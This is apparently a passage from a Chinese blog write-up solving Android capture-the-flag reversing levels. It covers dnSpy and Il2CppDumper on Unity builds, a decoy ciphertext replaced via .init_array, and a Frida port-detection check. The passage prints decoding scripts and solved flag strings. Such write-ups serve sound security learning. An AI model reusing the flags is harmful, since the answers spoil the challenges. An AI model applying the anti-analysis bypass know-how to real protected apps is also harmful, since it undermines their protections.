<span class="hljs-number">0</span>x90, <span class="hljs-number">0</span>x88, <span class="hljs-number">0</span>xA0, <span class="hljs-number">0</span>xA6, <span class="hljs-number">0</span>x90, <span class="hljs-number">0</span>x8A, <span class="hljs-number">0</span>xA0, <span class="hljs-number">0</span>xB4, <span class="hljs-number">0</span>x91, <span class="hljs-number">0</span>x90, <span class="hljs-number">0</span>x88, <span class="hljs-number">0</span>xA0, <span class="hljs-number">0</span>xB1, <span class="hljs-number">0</span>x9E, <span class="hljs-number">0</span>x8B, <span class="hljs-number">0</span>x96, <span class="hljs-number">0</span>x89, <span class="hljs-number">0</span>x9A, <span class="hljs-number">0</span>xA0, <span class="hljs-number">0</span>x8D, <span class="hljs-number">0</span>x9A, <span class="hljs-number">0</span>x9E, <span class="hljs-number">0</span>x93, <span class="hljs-number">0</span>xA0, <span class="hljs-number">0</span>x9B, <span class="hljs-number">0</span>x86, <span class="hljs-number">0</span>x91, <span class="hljs-number">0</span>x9E, <span class="hljs-number">0</span>x92, <span class="hljs-number">0</span>x96, <span class="hljs-number">0</span>x9C, <span class="hljs-number">0</span>xA0, <span class="hljs-number">0</span>x8D, <span class="hljs-number">0</span>x9A, <span class="hljs-number">0</span>x98, <span class="hljs-number">0</span>x96, <span class="hljs-number">0</span>x8C, <span class="hljs-number">0</span>x8B, <span class="hljs-number">0</span>x8D, <span class="hljs-number">0</span>x9E, <span class="hljs-number">0</span>x8B, <span class="hljs-number">0</span>x96, <span class="hljs-number">0</span>x90, <span class="hljs-number">0</span>x91, <span class="hljs-number">0</span>x82<br></code></pre></td></tr></table></figure><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">ida_chars = [<br>    <span class="hljs-number">0x99</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0xA6</span>,<br>    <span class="hljs-number">0x90</span>, <span class="hljs-number">0x8A</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0xB4</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0x9E</span>,<br>    <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0xA0</span>,<br>    <span class="hljs-number">0x9B</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x9A</span>,<br>    <span class="hljs-number">0x98</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x91</span>,<br>    <span class="hljs-number">0x82</span><br>]<br><br>decrypted_string = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">chr</span>(~byte &amp; <span class="hljs-number">0xFF</span>) <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> ida_chars)<br><span class="hljs-built_in">print</span>(decrypted_string)<br><br></code></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">flag&#123;Now_You_Know_Native_real_dynamic_registration&#125;<br></code></pre></td></tr></table></figure><h1 id="GAME-level5"><a href="#GAME-level5" class="headerlink" title="GAME-level5"></a>GAME-level5</h1><p>Jeb 打开发现了关于 Unity 的东西，猜测这个程序估计是用 Unity 写的</p><p><img src="https://img.dkdun.cn/v1/2025/12/f1df02fcb69e0554.png"></p><p>把 <code>\assets\bin\Data\Managed\</code> 下的 <code>Assembly-CSharp.dll</code>  文件丢进 dnSpy 看看，在 <code>GameWindow</code> 找到 flag</p><p><img src="https://img.dkdun.cn/v1/2025/12/336e506c9ec7a7de.png"></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">flag&#123;justaeasyunitygame&#125;<br></code></pre></td></tr></table></figure><h1 id="GAME-level6"><a href="#GAME-level6" class="headerlink" title="GAME-level6"></a>GAME-level6</h1><p>第一次见这个东西，还挺新奇hhhhh</p><p>发现有一个 Mono 文件夹 </p><p><img src="https://img.dkdun.cn/v1/2025/12/338a59f0d8c91616.png"></p><p>Unity 使用 Mono 方式打出来的 apk，如果没有加密我们可以直接从包内拿到 <code>Assembly-CSharp.dll</code>，可以直接使用 <code>dnSpy.exe </code>对其进行反编译。<br>如果使用 <code>IL2CPP</code> 方式出包，则没有 <code>Assembly-CSharp.dll</code>，有一个 <code>IL2CppDumper</code> 工具，<a href="https://github.com/Perfare/Il2CppDumper%EF%BC%8C%E9%80%9A%E8%BF%87%E5%AE%83%EF%BC%8C%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BB%A5%E9%80%86%E5%90%91%E5%BE%97%E5%88%B0">https://github.com/Perfare/Il2CppDumper，通过它，我们可以逆向得到</a> <code>Assembly-CSharp.dll</code></p><p>创建一个 <code>input</code> 和 <code>output</code>，将 <code>libil2cpp.so</code> 与 <code>global-metadata.dat</code> 拷贝到 <code>input</code> 目录中，</p><p><img src="https://img.dkdun.cn/v1/2025/12/acef11ddd1eea039.png"></p><p>可以创建一个批处理文件到 <code>input</code></p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bat">..\Il2CppDumper.exe libil2cpp.so global-metadata.dat ..\output<br></code></pre></td></tr></table></figure><p>环境 <code>.NET</code> 需要用 <code>6.0.0</code> 版本</p><p><img src="https://img.dkdun.cn/v1/2025/12/77a2c254193111c4.png"></p><p>然后打开这个 <code>.dll</code> 文件发现有一个 <code>FlagText</code>，但是是没有内容的</p><p><img src="https://img.dkdun.cn/v1/2025/12/ff917dbc6e5c5c71.png"></p><p>打开 <code>libil2cpp.so</code> ,加载 IL2CppDumper 文件夹里的 ida_py3.py 文件把 dump 出来的 script.json 加载进去,<code>FlagText</code> 偏移值为 <code>0x40</code>，在 ida 里面跳转，可以看到有 Flags 字样，但是还是什么都没有</p><p>查看 <code>LoadLevel</code> 函数，加载到了 <code>UnityEngine_Transform__SetParent_8767024</code> 函数，但是我 ida 后面加载不出来了，唉唉唉</p><h1 id="Init-Array-level7"><a href="#Init-Array-level7" class="headerlink" title="Init_Array-level7"></a>Init_Array-level7</h1><p>看源码，调用了 <code>native</code> 层 <code>Check</code>，因此就应该去分析 <code>.so</code> 文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.swdd.summertrain;<br><br><span class="hljs-keyword">import</span> android.os.Bundle;<br><span class="hljs-keyword">import</span> android.view.View;<br><span class="hljs-keyword">import</span> android.widget.TextView;<br><span class="hljs-keyword">import</span> android.widget.Toast;<br><span class="hljs-keyword">import</span> androidx.appcompat.app.AppCompatActivity;<br><span class="hljs-keyword">import</span> com.swdd.summertrain.databinding.ActivityMainBinding;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MainActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AppCompatActivity</span> &#123;<br>    <span class="hljs-keyword">private</span> ActivityMainBinding binding;<br><br>    <span class="hljs-keyword">static</span> &#123;<br>        System.loadLibrary(<span class="hljs-string">&quot;summertrain&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">native</span> Boolean <span class="hljs-title function_">Check</span><span class="hljs-params">(String arg1)</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onClick</span><span class="hljs-params">(View V)</span> &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">this</span>.Check(((TextView)<span class="hljs-built_in">this</span>.findViewById(id.input)).getText().toString()).booleanValue()) &#123;<br>            Toast.makeText(<span class="hljs-built_in">this</span>, <span class="hljs-string">&quot;Good!&quot;</span>, <span class="hljs-number">0</span>).show();<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br><br>        Toast.makeText(<span class="hljs-built_in">this</span>, <span class="hljs-string">&quot;Try Again&quot;</span>, <span class="hljs-number">0</span>).show();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span>  <span class="hljs-comment">// androidx.fragment.app.FragmentActivity</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> &#123;<br>        <span class="hljs-built_in">super</span>.onCreate(savedInstanceState);<br>        <span class="hljs-type">ActivityMainBinding</span> <span class="hljs-variable">activityMainBinding0</span> <span class="hljs-operator">=</span> ActivityMainBinding.inflate(<span class="hljs-built_in">this</span>.getLayoutInflater());<br>        <span class="hljs-built_in">this</span>.binding = activityMainBinding0;<br>        <span class="hljs-built_in">this</span>.setContentView(activityMainBinding0.getRoot());<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>查看 <code>Java_com_swdd_summertrain_MainActivity_Check</code> 函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">Java_com_swdd_summertrain_MainActivity_Check</span><span class="hljs-params">(__int64 a1, __int64 a2, __int64 a3)</span></span><br><span class="hljs-function"></span>&#123;<br>    ...<br>  v3 = a3;<br>  v4 = <span class="hljs-number">0LL</span>;<br>  v5 = (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)(*(__int64 (__fastcall **)(__int64, __int64, _QWORD))(*(_QWORD *)a1 + <span class="hljs-number">1352LL</span>))(a1, a3, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-keyword">if</span> ( !v5 )<br>    <span class="hljs-keyword">return</span> v4;<br>  v6 = v5;<br>  v26 = v3;<br>  v7 = <span class="hljs-built_in">strlen</span>(v5);<br>  v8 = (<span class="hljs-type">char</span> *)<span class="hljs-keyword">operator</span> <span class="hljs-keyword">new</span>[](v7 + <span class="hljs-number">1</span>);<br>  <span class="hljs-keyword">if</span> ( !v7 )<br>    <span class="hljs-keyword">goto</span> LABEL_11;<br>  <span class="hljs-keyword">if</span> ( v7 &lt; <span class="hljs-number">8</span> || v8 &lt; &amp;v6[v7] &amp;&amp; v6 &lt; &amp;v8[v7] )<br>  &#123;<br>    v9 = <span class="hljs-number">0LL</span>;<br>LABEL_7:<br>    v10 = v7 + ~v9;<br>    v11 = v7 &amp; <span class="hljs-number">3</span>;<br>    <span class="hljs-keyword">if</span> ( (v7 &amp; <span class="hljs-number">3</span>) != <span class="hljs-number">0</span> )<br>    &#123;<br>      <span class="hljs-keyword">do</span><br>      &#123;<br>        v8[v9] = ~v6[v9];<br>        ++v9;<br>        --v11;<br>      &#125;<br>      <span class="hljs-keyword">while</span> ( v11 );<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( v10 &gt;= <span class="hljs-number">3</span> )<br>    &#123;<br>      <span class="hljs-keyword">do</span><br>      &#123;<br>        v8[v9] = ~v6[v9];<br>        v8[v9 + <span class="hljs-number">1</span>] = ~v6[v9 + <span class="hljs-number">1</span>];<br>        v8[v9 + <span class="hljs-number">2</span>] = ~v6[v9 + <span class="hljs-number">2</span>];<br>        v8[v9 + <span class="hljs-number">3</span>] = ~v6[v9 + <span class="hljs-number">3</span>];<br>        v9 += <span class="hljs-number">4LL</span>;<br>      &#125;<br>      <span class="hljs-keyword">while</span> ( v7 != v9 );<br>    &#125;<br>    <span class="hljs-keyword">goto</span> LABEL_11;<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( v7 &gt;= <span class="hljs-number">0x20</span> )<br>  &#123;<br>    v9 = v7 &amp; <span class="hljs-number">0xFFFFFFFFFFFFFFE0LL</span>;<br>    v19 = (((v7 &amp; <span class="hljs-number">0xFFFFFFFFFFFFFFE0LL</span>) - <span class="hljs-number">32</span>) &gt;&gt; <span class="hljs-number">5</span>) + <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> ( (v7 &amp; <span class="hljs-number">0xFFFFFFFFFFFFFFE0LL</span>) == <span class="hljs-number">32</span> )<br>    &#123;<br>      v21 = <span class="hljs-number">0LL</span>;<br>      <span class="hljs-keyword">if</span> ( (v19 &amp; <span class="hljs-number">1</span>) == <span class="hljs-number">0</span> )<br>        <span class="hljs-keyword">goto</span> LABEL_22;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      v20 = v19 &amp; <span class="hljs-number">0xFFFFFFFFFFFFFFFELL</span>;<br>      v21 = <span class="hljs-number">0LL</span>;<br>      <span class="hljs-keyword">do</span><br>      &#123;<br>        v22 = _mm_xor_si128(_mm_loadu_si128((<span class="hljs-type">const</span> __m128i *)&amp;v6[v21 + <span class="hljs-number">16</span>]), (__m128i)<span class="hljs-number">-1LL</span>);<br>        *(__m128i *)&amp;v8[v21] = _mm_xor_si128(_mm_loadu_si128((<span class="hljs-type">const</span> __m128i *)&amp;v6[v21]), (__m128i)<span class="hljs-number">-1LL</span>);<br>        *(__m128i *)&amp;v8[v21 + <span class="hljs-number">16</span>] = v22;<br>        v23 = _mm_xor_si128(_mm_loadu_si128((<span class="hljs-type">const</span> __m128i *)&amp;v6[v21 + <span class="hljs-number">48</span>]), (__m128i)<span class="hljs-number">-1LL</span>);<br>        *(__m128i *)&amp;v8[v21 + <span class="hljs-number">32</span>] = _mm_xor_si128(_mm_loadu_si128((<span class="hljs-type">const</span> __m128i *)&amp;v6[v21 + <span class="hljs-number">32</span>]), (__m128i)<span class="hljs-number">-1LL</span>);<br>        *(__m128i *)&amp;v8[v21 + <span class="hljs-number">48</span>] = v23;<br>        v21 += <span class="hljs-number">64LL</span>;<br>        v20 -= <span class="hljs-number">2LL</span>;<br>      &#125;<br>      <span class="hljs-keyword">while</span> ( v20 );<br>      <span class="hljs-keyword">if</span> ( (v19 &amp; <span class="hljs-number">1</span>) == <span class="hljs-number">0</span> )<br>        <span class="hljs-keyword">goto</span> LABEL_22;<br>    &#125;<br>    v24 = _mm_xor_si128(_mm_loadu_si128((<span class="hljs-type">const</span> __m128i *)&amp;v6[v21 + <span class="hljs-number">16</span>]), (__m128i)<span class="hljs-number">-1LL</span>);<br>    *(__m128i *)&amp;v8[v21] = _mm_xor_si128(_mm_loadu_si128((<span class="hljs-type">const</span> __m128i *)&amp;v6[v21]), (__m128i)<span class="hljs-number">-1LL</span>);<br>    *(__m128i *)&amp;v8[v21 + <span class="hljs-number">16</span>] = v24;<br>LABEL_22:<br>    <span class="hljs-keyword">if</span> ( v7 == v9 )<br>      <span class="hljs-keyword">goto</span> LABEL_11;<br>    <span class="hljs-keyword">if</span> ( (v7 &amp; <span class="hljs-number">0x18</span>) == <span class="hljs-number">0</span> )<br>      <span class="hljs-keyword">goto</span> LABEL_7;<br>    <span class="hljs-keyword">goto</span> LABEL_24;<br>  &#125;<br>  v9 = <span class="hljs-number">0LL</span>;<br>LABEL_24:<br>  v25 = v9;<br>  v9 = v7 &amp; <span class="hljs-number">0xFFFFFFFFFFFFFFF8LL</span>;<br>  <span class="hljs-keyword">do</span><br>  &#123;<br>    *(_QWORD *)&amp;v8[v25] = _mm_xor_si128(_mm_loadl_epi64((<span class="hljs-type">const</span> __m128i *)&amp;v6[v25]), (__m128i)<span class="hljs-number">-1LL</span>).m128i_u64[<span class="hljs-number">0</span>];<br>    v25 += <span class="hljs-number">8LL</span>;<br>  &#125;<br>  <span class="hljs-keyword">while</span> ( v9 != v25 );<br>  <span class="hljs-keyword">if</span> ( v7 != v9 )<br>    <span class="hljs-keyword">goto</span> LABEL_7;<br>LABEL_11:<br>  v8[v7] = <span class="hljs-number">0</span>;<br>  v12 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">if</span> ( v7 == (<span class="hljs-type">int</span>)__strlen_chk(&amp;storedBytes, <span class="hljs-number">256LL</span>) )<br>    v12 = <span class="hljs-built_in">memcmp</span>(v8, &amp;storedBytes, v7) == <span class="hljs-number">0</span>;<br>  v13 = (*(__int64 (__fastcall **)(__int64, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *))(*(_QWORD *)a1 + <span class="hljs-number">48LL</span>))(a1, <span class="hljs-string">&quot;java/lang/Boolean&quot;</span>);<br>  v14 = v13;<br>  v15 = (*(__int64 (__fastcall **)(__int64, __int64, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *))(*(_QWORD *)a1 + <span class="hljs-number">264LL</span>))(<br>          a1,<br>          v13,<br>          <span class="hljs-string">&quot;&lt;init&gt;&quot;</span>,<br>          <span class="hljs-string">&quot;(Z)V&quot;</span>);<br>  v4 = _JNIEnv::<span class="hljs-built_in">NewObject</span>(a1, v14, v15, v12, v16, v17, v26);<br>  (*(<span class="hljs-built_in">void</span> (__fastcall **)(__int64, __int64, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *))(*(_QWORD *)a1 + <span class="hljs-number">1360LL</span>))(a1, v27, v6);<br>  <span class="hljs-keyword">operator</span> <span class="hljs-keyword">delete</span>[](v8);<br>  <span class="hljs-keyword">return</span> v4;<br>&#125;<br></code></pre></td></tr></table></figure><p>大概流程和 “动态注册” 这个题差不多，对传入字符串按位取反，最后存储在 <code>storedBytes</code> 中，把密文提取出来，解出来居然是假的，what can i say.jpg</p><p><img src="https://img.dkdun.cn/v1/2025/12/ee3e640eabe6526b.png"></p><p>然后看了下 <a href="https://bbs.kanxue.com/user-home-979679.htm">Shangwendada</a> 的《对init_array段调用的方法进行Hook》这篇文章，首先我们在 <code>segments</code> 窗口中看到各个段的偏移，找到了 <code>.init_array</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/2f5d4e6f30c67607.png"></p><p>找到了 <code>sub_17360</code> 函数</p><p><img src="https://img.dkdun.cn/v1/2025/12/83eba5c9f480fd9f.png"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">__int64 <span class="hljs-title">sub_17360</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-built_in">memcpy</span>(&amp;storedBytes, &amp;unk_CA70, <span class="hljs-number">0x100uLL</span>);<br>  <span class="hljs-keyword">return</span> __android_log_print(<span class="hljs-number">4LL</span>, <span class="hljs-string">&quot;GenFunction&quot;</span>, <span class="hljs-string">&quot;Gen function called.&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>原来 <code>storedBytes</code> 保存了从 <code>unk_CA70</code> 复制的数据，那 <code>unk_CA70</code> 应该就是正确的密文</p><p><img src="https://img.dkdun.cn/v1/2025/12/c2343f20172c0f9d.png"></p><p>exp 也是和之前那个题一样，换一下密文就行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">ida_chars = [<br>  <span class="hljs-number">0x99</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0xB6</span>,<br>  <span class="hljs-number">0x91</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0x82</span><br>]<br><br>decrypted_string = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">chr</span>(~byte &amp; <span class="hljs-number">0xFF</span>) <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> ida_chars)<br><span class="hljs-built_in">print</span>(decrypted_string)<br></code></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">flag&#123;EasyInitArray&#125;<br></code></pre></td></tr></table></figure><h1 id="Frida-端口检测-level8"><a href="#Frida-端口检测-level8" class="headerlink" title="Frida 端口检测-level8"></a><strong>Frida 端口检测</strong>-level8</h1><p>先反编译一下，在 <code>native</code> 层调用了 <code>Check</code> 函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.swdd.summertrain;<br><br><span class="hljs-keyword">import</span> android.os.Bundle;<br><span class="hljs-keyword">import</span> android.view.View;<br><span class="hljs-keyword">import</span> android.widget.TextView;<br><span class="hljs-keyword">import</span> android.widget.Toast;<br><span class="hljs-keyword">import</span> androidx.appcompat.app.AppCompatActivity;<br><span class="hljs-keyword">import</span> com.swdd.summertrain.databinding.ActivityMainBinding;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MainActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AppCompatActivity</span> &#123;<br>    <span class="hljs-keyword">private</span> ActivityMainBinding binding;<br><br>    <span class="hljs-keyword">static</span> &#123;<br>        System.loadLibrary(<span class="hljs-string">&quot;summertrain&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">native</span> Boolean <span class="hljs-title function_">Check</span><span class="hljs-params">(String arg1)</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onClick</span><span class="hljs-params">(View view0)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> ((TextView)<span class="hljs-built_in">this</span>.findViewById(id.input)).getText().toString();<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">this</span>.Check(s).booleanValue()) &#123;<br>            Toast.makeText(<span class="hljs-built_in">this</span>, <span class="hljs-string">&quot;Good! Your flag is flag&#123;&quot;</span> + s + <span class="hljs-string">&quot;&#125;&quot;</span>, <span class="hljs-number">0</span>).show();<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br><br>        Toast.makeText(<span class="hljs-built_in">this</span>, <span class="hljs-string">&quot;Try Again&quot;</span>, <span class="hljs-number">0</span>).show();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span>  <span class="hljs-comment">// androidx.fragment.app.FragmentActivity</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(Bundle bundle0)</span> &#123;<br>        <span class="hljs-built_in">super</span>.onCreate(bundle0);<br>        <span class="hljs-type">ActivityMainBinding</span> <span class="hljs-variable">activityMainBinding0</span> <span class="hljs-operator">=</span> ActivityMainBinding.inflate(<span class="hljs-built_in">this</span>.getLayoutInflater());<br>        <span class="hljs-built_in">this</span>.binding = activityMainBinding0;<br>        <span class="hljs-built_in">this</span>.setContentView(activityMainBinding0.getRoot());<br>    &#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>没啥有用的信息，直接运行一下程序，正常是可以运行的，在启动了 <code>frida</code> 后程序停止运行了</p><p><img src="https://img.dkdun.cn/v1/2025/12/0cf6bfb81fd443cd.png"></p><p>这个时候就可以查看 <code>.so</code>  文件了，在 <code>segments</code> 窗口中看各个段的偏移，找到了 <code>.init_array</code> 然后进入<code>sub_F40</code> 函数</p><p>下面的一大堆什么玩意儿我也看不懂qwq，但是前面有一个 <code>check_ports</code> 函数</p><p><img src="https://img.dkdun.cn/v1/2025/12/308618ee3d58d3f3.png"></p><p>大概内容是通过 <code>connect</code> 检测连接 <code>127.0.0.1</code> 的两个端口检测是否被连接</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">*&amp;addr.s<span class="hljs-built_in">a_family</span> = <span class="hljs-number">0</span>xA2690002<span class="hljs-comment">;       </span><br>*addr.s<span class="hljs-built_in">a_data</span> = <span class="hljs-number">0</span>x8A5D<span class="hljs-comment">;              